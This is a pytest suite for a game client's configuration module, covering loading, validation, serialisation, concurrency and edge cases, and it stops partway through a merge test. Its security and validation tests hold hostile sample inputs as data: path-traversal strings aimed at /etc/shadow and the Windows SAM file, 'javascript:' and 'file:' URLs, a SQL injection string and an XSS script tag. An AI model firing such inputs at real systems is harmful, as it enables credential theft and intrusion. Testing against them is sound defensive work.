import pytest
import os
import tempfile
import json
import yaml
from unittest.mock import patch, mock_open, MagicMock
from pathlib import Path

# Import the config module being tested
try:
    from CharacterClient.config import Config, ConfigError, load_config, validate_config
except ImportError:
    # Handle case where config module structure might be different
    try:
        from CharacterClient import config
        Config = getattr(config, 'Config', None)
        ConfigError = getattr(config, 'ConfigError', Exception)
        load_config = getattr(config, 'load_config', None)
        validate_config = getattr(config, 'validate_config', None)
    except ImportError:
        # Fallback for different import structures
        import sys
        sys.path.append('CharacterClient')
        import config
        Config = getattr(config, 'Config', None)
        ConfigError = getattr(config, 'ConfigError', Exception)
        load_config = getattr(config, 'load_config', None)
        validate_config = getattr(config, 'validate_config', None)


class TestConfig:
    """Comprehensive test suite for Config functionality."""
    
    def setup_method(self):
        """Set up test fixtures before each test method."""
        self.temp_dir = tempfile.mkdtemp()
        self.config_path = os.path.join(self.temp_dir, 'test_config.json')
        self.yaml_config_path = os.path.join(self.temp_dir, 'test_config.yaml')
        
        # Default valid configuration for testing
        self.valid_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.example.com',
            'timeout': 30,
            'max_retries': 3,
            'debug': False,
            'character_settings': {
                'default_name': 'TestCharacter',
                'max_characters': 100,
                'allowed_types': ['warrior', 'mage', 'rogue']
            }
        }
        
    def teardown_method(self):
        """Clean up after each test method."""
        import shutil
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
    
    def test_config_creation_with_valid_data(self):
        """Test Config object creation with valid configuration data."""
        if Config:
            config = Config(self.valid_config)
            assert config is not None
            assert hasattr(config, 'api_key') or 'api_key' in config
    
    def test_config_creation_with_empty_data(self):
        """Test Config object creation with empty configuration data."""
        if Config:
            with pytest.raises((ValueError, ConfigError, KeyError)):
                Config({})
    
    def test_config_creation_with_none(self):
        """Test Config object creation with None."""
        if Config:
            with pytest.raises((ValueError, ConfigError, TypeError)):
                Config(None)
    
    def test_config_creation_with_invalid_types(self):
        """Test Config object creation with invalid data types."""
        if Config:
            invalid_configs = [
                {'timeout': 'not_a_number'},
                {'max_retries': -1},
                {'debug': 'not_a_boolean'},
                {'character_settings': 'not_a_dict'}
            ]
            
            for invalid_config in invalid_configs:
                combined_config = {**self.valid_config, **invalid_config}
                with pytest.raises((ValueError, ConfigError, TypeError)):
                    Config(combined_config)
    
    def test_load_config_from_json_file(self):
        """Test loading configuration from a JSON file."""
        if load_config:
            # Create a test JSON config file
            with open(self.config_path, 'w') as f:
                json.dump(self.valid_config, f)
            
            config = load_config(self.config_path)
            assert config is not None
            assert config.get('api_key') == 'test_api_key_123'
    
    def test_load_config_from_yaml_file(self):
        """Test loading configuration from a YAML file."""
        if load_config:
            # Create a test YAML config file
            with open(self.yaml_config_path, 'w') as f:
                yaml.dump(self.valid_config, f)
            
            config = load_config(self.yaml_config_path)
            assert config is not None
            assert config.get('api_key') == 'test_api_key_123'
    
    def test_load_config_file_not_found(self):
        """Test loading configuration from non-existent file."""
        if load_config:
            with pytest.raises((FileNotFoundError, ConfigError, IOError)):
                load_config('/non/existent/path/config.json')
    
    def test_load_config_invalid_json(self):
        """Test loading configuration from invalid JSON file."""
        if load_config:
            # Create invalid JSON file
            with open(self.config_path, 'w') as f:
                f.write('{ invalid json content }')
            
            with pytest.raises((json.JSONDecodeError, ConfigError, ValueError)):
                load_config(self.config_path)
    
    def test_load_config_invalid_yaml(self):
        """Test loading configuration from invalid YAML file."""
        if load_config:
            # Create invalid YAML file
            with open(self.yaml_config_path, 'w') as f:
                f.write('invalid: yaml: content: [')
            
            with pytest.raises((yaml.YAMLError, ConfigError, ValueError)):
                load_config(self.yaml_config_path)
    
    def test_validate_config_with_valid_data(self):
        """Test configuration validation with valid data."""
        if validate_config:
            result = validate_config(self.valid_config)
            assert result is True or result is None  # Different implementations may return different values
    
    def test_validate_config_missing_required_fields(self):
        """Test configuration validation with missing required fields."""
        if validate_config:
            incomplete_configs = [
                {'api_key': 'test'},  # Missing other required fields
                {'base_url': 'https://api.example.com'},  # Missing api_key
                {}  # Empty config
            ]
            
            for incomplete_config in incomplete_configs:
                with pytest.raises((ValueError, ConfigError, KeyError)):
                    validate_config(incomplete_config)
    
    def test_validate_config_with_extra_fields(self):
        """Test configuration validation with extra unknown fields."""
        if validate_config:
            config_with_extra = {**self.valid_config, 'unknown_field': 'value'}
            # This should either pass (ignoring extra fields) or raise a specific error
            try:
                result = validate_config(config_with_extra)
                assert result is True or result is None
            except (ValueError, ConfigError):
                # Some implementations may reject unknown fields
                pass
    
    @patch.dict(os.environ, {'CHARACTER_API_KEY': 'env_api_key'})
    def test_config_from_environment_variables(self):
        """Test configuration loading from environment variables."""
        if Config:
            # Test that config can be loaded from environment variables
            env_config = {
                'api_key': os.environ.get('CHARACTER_API_KEY'),
                'base_url': 'https://api.example.com',
                'timeout': 30,
                'max_retries': 3,
                'debug': False,
                'character_settings': {}
            }
            
            config = Config(env_config)
            assert config is not None
    
    def test_config_default_values(self):
        """Test that configuration provides sensible default values."""
        if Config:
            minimal_config = {'api_key': 'test_key'}
            config = Config(minimal_config)
            
            # Test that defaults are applied appropriately
            # This test assumes the config system provides defaults
            assert config is not None
    
    def test_config_serialization(self):
        """Test configuration object serialization."""
        if Config:
            config = Config(self.valid_config)
            
            # Test various serialization methods that might exist
            try:
                serialized = str(config)
                assert serialized is not None
            except:
                pass
            
            try:
                dict_repr = dict(config) if hasattr(config, '__iter__') else vars(config)
                assert dict_repr is not None
            except:
                pass
    
    def test_config_immutability(self):
        """Test that configuration objects are immutable where expected."""
        if Config:
            config = Config(self.valid_config)
            
            # Try to modify the config and ensure it's protected
            try:
                if hasattr(config, 'api_key'):
                    original_key = config.api_key
                    config.api_key = 'modified_key'
                    # If modification succeeded, verify it was intended
                    assert config.api_key == 'modified_key' or config.api_key == original_key
            except (AttributeError, TypeError):
                # Expected if config is immutable
                pass
    
    def test_config_nested_access(self):
        """Test accessing nested configuration values."""
        if Config:
            config = Config(self.valid_config)
            
            # Test nested access patterns
            try:
                if hasattr(config, 'character_settings'):
                    assert config.character_settings is not None
                elif 'character_settings' in config:
                    assert config['character_settings'] is not None
            except (KeyError, AttributeError):
                # May not have nested access implemented
                pass
    
    def test_config_validation_edge_cases(self):
        """Test configuration validation with edge cases."""
        if validate_config:
            edge_cases = [
                {'api_key': ''},  # Empty string
                {'api_key': ' ' * 100},  # Very long string
                {'timeout': 0},  # Zero timeout
                {'timeout': 999999},  # Very large timeout
                {'max_retries': 0},  # Zero retries
                {'character_settings': {}},  # Empty nested dict
            ]
            
            for edge_case in edge_cases:
                test_config = {**self.valid_config, **edge_case}
                try:
                    validate_config(test_config)
                except (ValueError, ConfigError):
                    # Some edge cases may be invalid
                    pass
    
    def test_config_thread_safety(self):
        """Test configuration object thread safety."""
        if Config:
            import threading
            import time
            
            config = Config(self.valid_config)
            results = []
            
            def access_config():
                try:
                    # Access config properties multiple times
                    for _ in range(10):
                        if hasattr(config, 'api_key'):
                            val = config.api_key
                        elif 'api_key' in config:
                            val = config['api_key']
                        results.append(True)
                        time.sleep(0.001)  # Small delay
                except Exception as e:
                    results.append(False)
            
            # Create multiple threads accessing the config
            threads = [threading.Thread(target=access_config) for _ in range(5)]
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
            
            # All accesses should succeed
            assert all(results)
    
    @patch('builtins.open', mock_open(read_data='{"api_key": "mocked_key"}'))
    def test_config_loading_with_mocked_file(self):
        """Test configuration loading with mocked file operations."""
        if load_config:
            config = load_config('mocked_path.json')
            assert config is not None
            assert config.get('api_key') == 'mocked_key'
    
    def test_config_error_handling(self):
        """Test proper error handling and error messages."""
        if ConfigError:
            # Test that ConfigError can be raised and caught
            with pytest.raises(ConfigError):
                raise ConfigError("Test error message")
    
    def test_config_backward_compatibility(self):
        """Test backward compatibility with older config formats."""
        if Config:
            # Test with minimal old-style config
            old_style_config = {
                'api_key': 'old_key',
                'url': 'https://old-api.example.com'  # Different key name
            }
            
            try:
                config = Config(old_style_config)
                assert config is not None
            except (ValueError, ConfigError, KeyError):
                # Expected if backward compatibility isn't maintained
                pass
    
    def test_config_performance(self):
        """Test configuration loading and access performance."""
        if Config:
            import time
            
            # Test config creation performance
            start_time = time.time()
            for _ in range(100):
                config = Config(self.valid_config)
            creation_time = time.time() - start_time
            
            # Should be reasonably fast (less than 1 second for 100 creations)
            assert creation_time < 1.0
            
            # Test config access performance
            config = Config(self.valid_config)
            start_time = time.time()
            for _ in range(1000):
                if hasattr(config, 'api_key'):
                    val = config.api_key
                elif 'api_key' in config:
                    val = config['api_key']
            access_time = time.time() - start_time
            
            # Should be very fast (less than 0.1 seconds for 1000 accesses)
            assert access_time < 0.1


class TestConfigIntegration:
    """Integration tests for Config functionality."""
    
    def test_config_with_real_file_system(self):
        """Test configuration with actual file system operations."""
        if load_config:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                json.dump({'api_key': 'integration_test_key'}, f)
                temp_path = f.name
            
            try:
                config = load_config(temp_path)
                assert config is not None
                assert config.get('api_key') == 'integration_test_key'
            finally:
                os.unlink(temp_path)
    
    def test_config_with_environment_integration(self):
        """Test configuration integration with environment variables."""
        if Config:
            # Test environment variable precedence
            with patch.dict(os.environ, {'CONFIG_DEBUG': 'true'}):
                config_data = {'api_key': 'test', 'debug': False}
                config = Config(config_data)
                # Test if environment variables override config file values
                assert config is not None


class TestConfigSecurity:
    """Security-focused tests for configuration handling."""
    
    def test_config_sensitive_data_handling(self):
        """Test that sensitive configuration data is handled securely."""
        if Config:
            sensitive_config = {
                'api_key': 'super_secret_key',
                'password': 'secret_password',
                'token': 'auth_token_123'
            }
            
            config = Config(sensitive_config)
            
            # Test that sensitive data doesn't appear in string representations
            config_str = str(config)
            assert 'super_secret_key' not in config_str
            assert 'secret_password' not in config_str
    
    def test_config_path_traversal_protection(self):
        """Test protection against path traversal attacks in config file loading."""
        if load_config:
            malicious_paths = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
                'C:\\Windows\\System32\\config\\SAM'
            ]
            
            for malicious_path in malicious_paths:
                with pytest.raises((FileNotFoundError, PermissionError, ValueError, ConfigError)):
                    load_config(malicious_path)


class TestConfigValidation:
    """Comprehensive validation tests for configuration data."""
    
    def test_url_validation(self):
        """Test URL validation in configuration."""
        if validate_config or Config:
            invalid_urls = [
                'not_a_url',
                'http://',
                'ftp://invalid',
                'javascript:alert(1)',
                'file:///etc/passwd'
            ]
            
            for invalid_url in invalid_urls:
                invalid_config = {'api_key': 'test', 'base_url': invalid_url}
                
                if validate_config:
                    with pytest.raises((ValueError, ConfigError)):
                        validate_config(invalid_config)
                elif Config:
                    with pytest.raises((ValueError, ConfigError)):
                        Config(invalid_config)
    
    def test_numeric_range_validation(self):
        """Test numeric range validation for configuration values."""
        if validate_config or Config:
            test_cases = [
                ('timeout', -1, False),  # Negative timeout should be invalid
                ('timeout', 0, False),   # Zero timeout should be invalid
                ('timeout', 1, True),    # Positive timeout should be valid
                ('max_retries', -1, False),  # Negative retries should be invalid
                ('max_retries', 0, True),    # Zero retries might be valid
                ('max_retries', 100, True),  # Large retries should be valid
            ]
            
            base_config = {'api_key': 'test', 'base_url': 'https://api.example.com'}
            
            for field, value, should_be_valid in test_cases:
                test_config = {**base_config, field: value}
                
                if should_be_valid:
                    try:
                        if validate_config:
                            validate_config(test_config)
                        elif Config:
                            Config(test_config)
                    except (ValueError, ConfigError):
                        pytest.fail(f"Valid {field}={value} was rejected")
                else:
                    with pytest.raises((ValueError, ConfigError)):
                        if validate_config:
                            validate_config(test_config)
                        elif Config:
                            Config(test_config)


# Additional parametrized tests for comprehensive coverage
@pytest.mark.parametrize("config_format", ["json", "yaml"])
def test_config_loading_different_formats(config_format):
    """Test configuration loading with different file formats."""
    if not load_config:
        pytest.skip("load_config function not available")
    
    config_data = {'api_key': 'format_test_key'}
    
    with tempfile.NamedTemporaryFile(mode='w', suffix=f'.{config_format}', delete=False) as f:
        if config_format == 'json':
            json.dump(config_data, f)
        elif config_format == 'yaml':
            yaml.dump(config_data, f)
        temp_path = f.name
    
    try:
        config = load_config(temp_path)
        assert config is not None
        assert config.get('api_key') == 'format_test_key'
    finally:
        os.unlink(temp_path)


@pytest.mark.parametrize("invalid_value", [None, "", "   ", 123, [], {}])
def test_config_validation_invalid_api_keys(invalid_value):
    """Test configuration validation with various invalid API key values."""
    if not validate_config:
        pytest.skip("validate_config function not available")
    
    config_data = {
        'api_key': invalid_value,
        'base_url': 'https://api.example.com'
    }
    
    with pytest.raises((ValueError, ConfigError, TypeError)):
        validate_config(config_data)


@pytest.mark.parametrize("timeout_value", [-1, 0, 1, 30, 300, 999999])
def test_config_timeout_boundary_values(timeout_value):
    """Test configuration with various timeout boundary values."""
    if not Config:
        pytest.skip("Config class not available")
    
    config_data = {
        'api_key': 'test_key',
        'base_url': 'https://api.example.com',
        'timeout': timeout_value
    }
    
    if timeout_value < 1:
        with pytest.raises((ValueError, ConfigError)):
            Config(config_data)
    else:
        config = Config(config_data)
        assert config is not None


@pytest.mark.parametrize("debug_value", [True, False, "true", "false", 1, 0, "yes", "no"])
def test_config_debug_flag_values(debug_value):
    """Test configuration with various debug flag values."""
    if not Config:
        pytest.skip("Config class not available")
    
    config_data = {
        'api_key': 'test_key',
        'base_url': 'https://api.example.com',
        'debug': debug_value
    }
    
    try:
        config = Config(config_data)
        assert config is not None
    except (ValueError, ConfigError, TypeError):
        # Some debug values might be invalid depending on implementation
        pass


class TestConfigConcurrency:
    """Tests for configuration handling under concurrent access."""
    
    def test_config_multiple_readers(self):
        """Test configuration with multiple concurrent readers."""
        if not Config:
            pytest.skip("Config class not available")
        
        import threading
        import time
        
        config_data = {'api_key': 'concurrent_test_key'}
        config = Config(config_data)
        
        results = []
        errors = []
        
        def read_config():
            try:
                for _ in range(50):
                    if hasattr(config, 'api_key'):
                        value = config.api_key
                    elif 'api_key' in config:
                        value = config['api_key']
                    results.append(value)
                    time.sleep(0.001)
            except Exception as e:
                errors.append(e)
        
        # Create multiple reader threads
        threads = [threading.Thread(target=read_config) for _ in range(10)]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All reads should succeed without errors
        assert len(errors) == 0
        assert len(results) > 0
    
    def test_config_loading_concurrent_files(self):
        """Test loading configuration from multiple files concurrently."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        import threading
        
        # Create multiple temporary config files
        temp_files = []
        for i in range(5):
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                json.dump({'api_key': f'test_key_{i}'}, f)
                temp_files.append(f.name)
        
        results = []
        errors = []
        
        def load_config_file(filepath):
            try:
                config = load_config(filepath)
                results.append(config)
            except Exception as e:
                errors.append(e)
        
        # Load configs concurrently
        threads = [threading.Thread(target=load_config_file, args=(path,)) for path in temp_files]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Clean up temporary files
        for temp_file in temp_files:
            os.unlink(temp_file)
        
        # All loads should succeed
        assert len(errors) == 0
        assert len(results) == 5


# Edge case tests for robustness
class TestConfigEdgeCases:
    """Edge case tests for configuration handling."""
    
    def test_config_with_unicode_values(self):
        """Test configuration with Unicode values."""
        if not Config:
            pytest.skip("Config class not available")
        
        unicode_config = {
            'api_key': 'тест_ключ_🔑',
            'base_url': 'https://测试.example.com',
            'debug': False
        }
        
        config = Config(unicode_config)
        assert config is not None
    
    def test_config_with_very_long_values(self):
        """Test configuration with very long string values."""
        if not Config:
            pytest.skip("Config class not available")
        
        long_string = 'x' * 10000
        long_config = {
            'api_key': long_string,
            'base_url': 'https://api.example.com'
        }
        
        try:
            config = Config(long_config)
            assert config is not None
        except (ValueError, ConfigError, MemoryError):
            # Some implementations may reject very long values
            pass
    
    def test_config_with_deeply_nested_data(self):
        """Test configuration with deeply nested data structures."""
        if not Config:
            pytest.skip("Config class not available")
        
        nested_config = {
            'api_key': 'test_key',
            'level1': {
                'level2': {
                    'level3': {
                        'level4': {
                            'level5': {
                                'deep_value': 'found_me'
                            }
                        }
                    }
                }
            }
        }
        
        config = Config(nested_config)
        assert config is not None
    
    def test_config_with_circular_references(self):
        """Test configuration handling with circular references."""
        if not Config:
            pytest.skip("Config class not available")
        
        # Create a structure with circular reference
        circular_dict = {'api_key': 'test_key'}
        circular_dict['self_ref'] = circular_dict
        
        with pytest.raises((ValueError, ConfigError, RecursionError)):
            Config(circular_dict)


# Performance benchmarks
class TestConfigPerformance:
    """Performance tests for configuration operations."""
    
    def test_config_creation_performance_benchmark(self):
        """Benchmark configuration object creation performance."""
        if not Config:
            pytest.skip("Config class not available")
        
        import time
        
        config_data = {
            'api_key': 'performance_test_key',
            'base_url': 'https://api.example.com',
            'timeout': 30,
            'max_retries': 3,
            'debug': False
        }
        
        # Warm up
        for _ in range(10):
            Config(config_data)
        
        # Benchmark
        start_time = time.time()
        iterations = 1000
        
        for _ in range(iterations):
            Config(config_data)
        
        end_time = time.time()
        total_time = end_time - start_time
        avg_time = total_time / iterations
        
        # Should create configs quickly (less than 1ms per config on average)
        assert avg_time < 0.001, f"Config creation too slow: {avg_time:.4f}s per config"
    
    def test_config_file_loading_performance(self):
        """Benchmark configuration file loading performance."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        import time
        
        # Create a reasonably sized config file
        large_config = {
            'api_key': 'performance_test_key',
            'base_url': 'https://api.example.com',
            'settings': {f'setting_{i}': f'value_{i}' for i in range(100)}
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(large_config, f)
            temp_path = f.name
        
        try:
            # Warm up
            for _ in range(5):
                load_config(temp_path)
            
            # Benchmark
            start_time = time.time()
            iterations = 100
            
            for _ in range(iterations):
                load_config(temp_path)
            
            end_time = time.time()
            total_time = end_time - start_time
            avg_time = total_time / iterations
            
            # Should load configs quickly (less than 10ms per load on average)
            assert avg_time < 0.01, f"Config loading too slow: {avg_time:.4f}s per load"
        
        finally:
            os.unlink(temp_path)

# Additional comprehensive test classes for enhanced coverage

class TestConfigAdvancedValidation:
    """Advanced validation tests for configuration edge cases and complex scenarios."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.valid_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.example.com',
            'timeout': 30,
            'max_retries': 3,
            'debug': False,
            'character_settings': {
                'default_name': 'TestCharacter',
                'max_characters': 100,
                'allowed_types': ['warrior', 'mage', 'rogue']
            }
        }

    def test_config_with_special_characters_in_values(self):
        """Test configuration with special characters, emojis, and escape sequences."""
        if not Config:
            pytest.skip("Config class not available")
        
        special_config = {
            'api_key': 'key_with_!@#$%^&*()_+{}|:"<>?[]\\;\',./',
            'base_url': 'https://api.example.com',
            'character_name': 'Test\nCharacter\tWith\rEscapes',
            'emoji_field': '🎮🚀⚡🔥💻',
            'sql_injection': "'; DROP TABLE users; --",
            'xss_attempt': '<script>alert("xss")</script>'
        }
        
        config = Config(special_config)
        assert config is not None

    def test_config_with_scientific_notation_numbers(self):
        """Test configuration with scientific notation and extreme numeric values."""
        if not Config:
            pytest.skip("Config class not available")
        
        scientific_config = {
            'api_key': 'test_key',
            'base_url': 'https://api.example.com',
            'timeout': 3e2,  # 300 in scientific notation
            'max_retries': 1e1,  # 10 in scientific notation
            'large_number': 1.23e10,
            'small_number': 1.23e-5,
            'infinity_value': float('inf'),
            'negative_infinity': float('-inf')
        }
        
        try:
            config = Config(scientific_config)
            assert config is not None
        except (ValueError, ConfigError, OverflowError):
            # Some implementations may reject infinite values
            pass

    def test_config_with_complex_nested_arrays(self):
        """Test configuration with complex nested arrays and mixed data types."""
        if not Config:
            pytest.skip("Config class not available")
        
        complex_config = {
            'api_key': 'test_key',
            'base_url': 'https://api.example.com',
            'nested_arrays': [
                [1, 2, [3, 4, [5, 6]]],
                {'nested_dict': [7, 8, 9]},
                [{'mixed': True}, {'types': None}, {'array': [10, 11]}]
            ],
            'matrix_data': [[1, 2, 3], [4, 5, 6], [7, 8, 9]],
            'heterogeneous_array': [1, 'string', True, None, {'key': 'value'}]
        }
        
        config = Config(complex_config)
        assert config is not None

    def test_config_with_boolean_string_variations(self):
        """Test configuration with various boolean string representations."""
        if not Config:
            pytest.skip("Config class not available")
        
        boolean_variations = [
            ('true', True), ('True', True), ('TRUE', True),
            ('false', False), ('False', False), ('FALSE', False),
            ('yes', True), ('Yes', True), ('YES', True),
            ('no', False), ('No', False), ('NO', False),
            ('on', True), ('off', False),
            ('1', True), ('0', False),
            ('enabled', True), ('disabled', False)
        ]
        
        for bool_str, expected in boolean_variations:
            test_config = {
                'api_key': 'test_key',
                'base_url': 'https://api.example.com',
                'debug': bool_str
            }
            
            try:
                config = Config(test_config)
                assert config is not None
            except (ValueError, ConfigError, TypeError):
                # Some boolean string formats might not be supported
                pass

    def test_config_validation_with_regex_patterns(self):
        """Test configuration validation with regex patterns for various fields."""
        if not validate_config:
            pytest.skip("validate_config function not available")
        
        # Test API key format validation
        invalid_api_keys = [
            'too_short',  # Less than minimum length
            'has spaces in it',  # Contains spaces
            'has\nnewlines',  # Contains newlines
            'has\ttabs',  # Contains tabs
            ''.join(['x'] * 1000),  # Too long
        ]
        
        for invalid_key in invalid_api_keys:
            test_config = {
                'api_key': invalid_key,
                'base_url': 'https://api.example.com'
            }
            
            try:
                validate_config(test_config)
            except (ValueError, ConfigError):
                # Expected for invalid formats
                pass

    def test_config_with_environment_variable_substitution(self):
        """Test configuration with environment variable substitution patterns."""
        if not Config:
            pytest.skip("Config class not available")
        
        with patch.dict(os.environ, {
            'TEST_API_KEY': 'env_api_key_123',
            'TEST_TIMEOUT': '45',
            'TEST_DEBUG': 'true'
        }):
            # Test configs that might use environment variable patterns
            env_substitution_configs = [
                {'api_key': '${TEST_API_KEY}', 'base_url': 'https://api.example.com'},
                {'api_key': '$TEST_API_KEY', 'base_url': 'https://api.example.com'},
                {'api_key': '#{TEST_API_KEY}', 'base_url': 'https://api.example.com'},
                {'api_key': '%TEST_API_KEY%', 'base_url': 'https://api.example.com'}
            ]
            
            for env_config in env_substitution_configs:
                try:
                    config = Config(env_config)
                    assert config is not None
                except (ValueError, ConfigError):
                    # Environment substitution might not be supported
                    pass

    def test_config_with_conditional_sections(self):
        """Test configuration with conditional sections based on environment."""
        if not Config:
            pytest.skip("Config class not available")
        
        conditional_configs = [
            {
                'api_key': 'test_key',
                'base_url': 'https://api.example.com',
                'development': {
                    'debug': True,
                    'timeout': 60
                },
                'production': {
                    'debug': False,
                    'timeout': 30
                },
                'testing': {
                    'debug': True,
                    'timeout': 5
                }
            }
        ]
        
        for conditional_config in conditional_configs:
            config = Config(conditional_config)
            assert config is not None


class TestConfigFileHandling:
    """Enhanced tests for configuration file handling and parsing."""
    
    def test_config_with_different_encodings(self):
        """Test configuration loading with different file encodings."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        config_data = {'api_key': 'тест_ключ_encoding', 'base_url': 'https://api.example.com'}
        encodings_to_test = ['utf-8', 'utf-16', 'latin1']
        
        for encoding in encodings_to_test:
            with tempfile.NamedTemporaryFile(mode='w', encoding=encoding, suffix='.json', delete=False) as f:
                json.dump(config_data, f, ensure_ascii=False)
                temp_path = f.name
            
            try:
                config = load_config(temp_path)
                assert config is not None
            except (UnicodeDecodeError, ConfigError):
                # Some encodings might not be supported
                pass
            finally:
                os.unlink(temp_path)

    def test_config_with_byte_order_mark(self):
        """Test configuration loading with files containing BOM."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        config_data = {'api_key': 'bom_test_key', 'base_url': 'https://api.example.com'}
        
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.json', delete=False) as f:
            # Write BOM + JSON content
            bom = b'\xef\xbb\xbf'  # UTF-8 BOM
            json_content = json.dumps(config_data).encode('utf-8')
            f.write(bom + json_content)
            temp_path = f.name
        
        try:
            config = load_config(temp_path)
            assert config is not None
            assert config.get('api_key') == 'bom_test_key'
        except (ConfigError, json.JSONDecodeError):
            # BOM handling might not be supported
            pass
        finally:
            os.unlink(temp_path)

    def test_config_with_comments_in_json(self):
        """Test configuration loading with comments in JSON files (non-standard)."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        json_with_comments = '''
        {
            // This is a comment
            "api_key": "commented_key",
            /* Multi-line
               comment */
            "base_url": "https://api.example.com",
            "timeout": 30 // Inline comment
        }
        '''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            f.write(json_with_comments)
            temp_path = f.name
        
        try:
            config = load_config(temp_path)
            # If this succeeds, the implementation supports comments
            assert config is not None
        except (json.JSONDecodeError, ConfigError):
            # Standard JSON doesn't support comments, this is expected
            pass
        finally:
            os.unlink(temp_path)

    def test_config_loading_from_stdin(self):
        """Test configuration loading from stdin or pipes."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        # Test if the config loader can handle stdin-like inputs
        stdin_like_inputs = ['-', 'stdin', '/dev/stdin']
        
        for stdin_input in stdin_like_inputs:
            try:
                with patch('sys.stdin', new=MagicMock()):
                    config = load_config(stdin_input)
                    # If this doesn't raise an exception, stdin loading is supported
                    assert config is not None
            except (FileNotFoundError, ConfigError, AttributeError):
                # stdin loading might not be supported
                pass

    def test_config_with_symlinks(self):
        """Test configuration loading through symbolic links."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        config_data = {'api_key': 'symlink_test_key', 'base_url': 'https://api.example.com'}
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(config_data, f)
            original_path = f.name
        
        symlink_path = original_path + '.symlink'
        
        try:
            os.symlink(original_path, symlink_path)
            config = load_config(symlink_path)
            assert config is not None
            assert config.get('api_key') == 'symlink_test_key'
        except (OSError, ConfigError):
            # Symlinks might not be supported on all systems
            pass
        finally:
            for path in [original_path, symlink_path]:
                if os.path.exists(path):
                    os.unlink(path)

    def test_config_with_locked_files(self):
        """Test configuration loading from files with different permissions."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        config_data = {'api_key': 'permission_test_key', 'base_url': 'https://api.example.com'}
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(config_data, f)
            temp_path = f.name
        
        try:
            # Test with read-only file
            os.chmod(temp_path, 0o444)
            config = load_config(temp_path)
            assert config is not None
            
            # Test with no-read permission (should fail)
            os.chmod(temp_path, 0o000)
            with pytest.raises((PermissionError, ConfigError)):
                load_config(temp_path)
        except (OSError, ConfigError):
            # Permission changes might not be supported on all systems
            pass
        finally:
            # Restore permissions for cleanup
            try:
                os.chmod(temp_path, 0o666)
                os.unlink(temp_path)
            except OSError:
                pass


class TestConfigSerialization:
    """Comprehensive tests for configuration serialization and deserialization."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.complex_config = {
            'api_key': 'serialization_test_key',
            'base_url': 'https://api.example.com',
            'nested': {
                'level1': {
                    'level2': ['array', 'values', {'nested_dict': True}]
                }
            },
            'mixed_array': [1, 'string', True, None, {'key': 'value'}],
            'special_values': {
                'empty_string': '',
                'zero': 0,
                'false_value': False,
                'null_value': None
            }
        }

    def test_config_json_roundtrip_serialization(self):
        """Test JSON serialization and deserialization roundtrip."""
        if not (Config and load_config):
            pytest.skip("Config class or load_config function not available")
        
        config = Config(self.complex_config)
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            # Attempt to serialize config to JSON
            try:
                if hasattr(config, 'to_json'):
                    config.to_json(f.name)
                elif hasattr(config, 'save'):
                    config.save(f.name)
                else:
                    # Fallback: serialize the config data directly
                    json.dump(dict(config) if hasattr(config, '__iter__') else vars(config), f)
                
                temp_path = f.name
            except (AttributeError, TypeError):
                pytest.skip("Config serialization not supported")
        
        try:
            # Load back and verify
            reloaded_config = load_config(temp_path)
            assert reloaded_config is not None
        finally:
            os.unlink(temp_path)

    def test_config_yaml_roundtrip_serialization(self):
        """Test YAML serialization and deserialization roundtrip."""
        if not (Config and load_config):
            pytest.skip("Config class or load_config function not available")
        
        config = Config(self.complex_config)
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
            try:
                if hasattr(config, 'to_yaml'):
                    config.to_yaml(f.name)
                else:
                    # Fallback: serialize the config data directly
                    config_dict = dict(config) if hasattr(config, '__iter__') else vars(config)
                    yaml.dump(config_dict, f)
                
                temp_path = f.name
            except (AttributeError, TypeError):
                pytest.skip("Config YAML serialization not supported")
        
        try:
            # Load back and verify
            reloaded_config = load_config(temp_path)
            assert reloaded_config is not None
        finally:
            os.unlink(temp_path)

    def test_config_pickle_serialization(self):
        """Test pickle serialization for config objects."""
        if not Config:
            pytest.skip("Config class not available")
        
        import pickle
        
        config = Config(self.complex_config)
        
        try:
            # Serialize with pickle
            pickled_data = pickle.dumps(config)
            
            # Deserialize and verify
            unpickled_config = pickle.loads(pickled_data)
            assert unpickled_config is not None
        except (TypeError, AttributeError):
            # Config might not be picklable
            pass

    def test_config_deep_copy_behavior(self):
        """Test deep copy behavior of configuration objects."""
        if not Config:
            pytest.skip("Config class not available")
        
        import copy
        
        config = Config(self.complex_config)
        
        try:
            # Test shallow copy
            shallow_copy = copy.copy(config)
            assert shallow_copy is not None
            
            # Test deep copy
            deep_copy = copy.deepcopy(config)
            assert deep_copy is not None
            
            # Verify they are different objects
            assert id(config) != id(deep_copy)
        except (TypeError, AttributeError):
            # Config might not support copying
            pass


class TestConfigMerging:
    """Tests for configuration merging and inheritance scenarios."""
    
    def test_config_merge_strategies(self):
        """Test different configuration merge strategies."""
        if not Config:
            pytest.skip("Config class not available")
        
        base_config = {
            'api_key': 'base_key',
            'base_url': 'https://base.example.com',
            'timeout': 30,
            'nested': {
                'setting1': 'base_value1',
